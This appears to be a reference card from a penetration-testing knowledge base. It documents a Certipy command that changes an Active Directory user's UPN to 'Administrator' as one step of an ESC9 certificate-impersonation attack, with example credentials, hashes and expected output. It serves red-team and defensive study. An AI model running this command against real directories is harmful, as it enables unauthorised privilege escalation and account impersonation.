---
type: command
executor: bash
data: >-
  certipy account update -username $_USERNAME -password $_PASSWORD -user
  $_TARGET_USER -upn $_NEW_UPN
output: null
platforms:
  - Linux
  - Windows
  - Active Directory
tags:
  - adcs
  - privilege-escalation
verified: true
validated: true
---

# certipy-account-update-user-upn

## Command

```bash
certipy account update -username $_USERNAME -password $_PASSWORD -user $_TARGET_USER -upn $_NEW_UPN
```

## Description

Updates the userPrincipalName (UPN) of a target AD user to enable impersonation in certificate requests during ESC9 attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -username $_USERNAME | Username for authentication | Yes |
| -password $_PASSWORD | Password for authentication | Yes |
| -user $_TARGET_USER | Target user to update (e.g., Jane) | Yes |
| -upn $_NEW_UPN | New UPN (e.g., Administrator, without domain) | Yes |

## Examples

### Basic Usage

```bash
certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
```

### Advanced Usage

```bash
certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## Expected Output

User updated successfully:

Updated UPN for Jane to Administrator

## Related

- [[procedures/Active-Directory-Certificate-Services-ESC9-Attack]]
- [[tools/Certipy]]
